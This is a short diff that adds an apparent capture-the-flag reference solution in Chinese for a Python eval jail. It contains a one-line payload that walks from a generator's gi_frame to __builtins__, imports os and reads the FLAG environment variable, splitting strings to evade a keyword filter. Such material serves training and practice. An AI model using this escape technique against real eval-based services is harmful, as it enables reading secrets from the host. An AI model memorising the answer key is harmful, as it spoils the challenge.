@@ -1,0 +1,5 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+# 生成器未耗尽时 gi_frame 活着，f_globals 即模块命名空间；
+# gi_ 需拆拼接，__builtins__ 是 module 用 __dict__ 挖
+getattr(gen, 'g'+'i_'+'frame').f_globals['__bu'+'iltins__'].__dict__['__import__']('o'+'s').__dict__['envi'+'ron']['F'+'LAG']
